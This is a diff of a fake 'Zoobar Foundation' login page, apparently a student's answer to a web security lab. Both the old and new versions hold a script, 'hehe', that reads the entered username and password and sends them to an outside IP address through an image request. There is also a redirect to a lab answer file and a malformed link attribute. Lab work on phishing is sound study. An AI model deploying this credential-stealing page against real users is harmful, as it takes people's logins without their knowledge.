@@ -5,17 +5,30 @@
         <title>
             Login - Zoobar Foundation
         </title>
-    </head>
-    <body>
         <script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
-        <script> 
-            var zoobars = myZoobars;
-            if (zoobars || true); {
-            location.href = "file:///home/httpd/lab3/answer-2.html"; 
+        <script>
+            try{
+                var zoobars = myZoobars;
+                if (zoobars || true); {
+                    location.href = "file:///home/httpd/lab3/answer-2.html"; 
+                }
+            }
+            catch(e){
+                console.log(e);
             }
         </script>
+        <script>
+            function hehe() {
+                var username = document.forms['0'].elements['0'].value;
+                var password = document.forms['0'].elements['1'].value;
+                var ip = "172.27.22.170:12346";
+                new Image().src = "http://"+ip+"/?payload="+username+","+password;
+            }
+        </script>
+    </head>
+    <body>
         <h1>
-            <a href="http://localhost:8080/zoobar/index.cgi/">
+            <a  ="http://localhost:8080/zoobar/index.cgi/">
                 Zoobar Foundation for Objective Policy
             </a>
         </h1>
@@ -28,30 +41,11 @@
                     <tbody>
                         <tr>
                             <td>Username:</td>
-                            <td><input name="login_username" size="20" autocomplete="no" value="" type="text"></td>
+                            <td><input name="login_username" size="20" autocomplete="no" type="text"></td>
                         </tr>
                         <tr>
                             <td>Password:</td>
                             <td colspan="2"><input name="login_password" size="20" autocomplete="no" type="password">
-                            <script>
-                                function hehe() {
-                                    var username = document.forms['loginform'].elements['login_username'].value;
-                                    var password = document.forms['loginform'].elements['login_password'].value;
-                                    //var req = new XMLHttpRequest();
-                                    var ip = "172.27.22.170:12346";
-                                    /*req.open(
-                                        "GET",
-                                        "http://"+ ip +
-                                        "?username="+username+
-                                        "&password="+password,
-                                        true
-                                    );*/
-                                    //req.send();
-                                    new Image().src = "http://172.27.22.170:12346/?username="+username+"&password="+password;
-                                    console.log(username, password);
-                                    
-                                }
-                            </script>
                             <input name="submit_login" value="Log in" type="submit">
                             <input name="submit_registration" value="Register" type="submit"></td>
                         </tr>
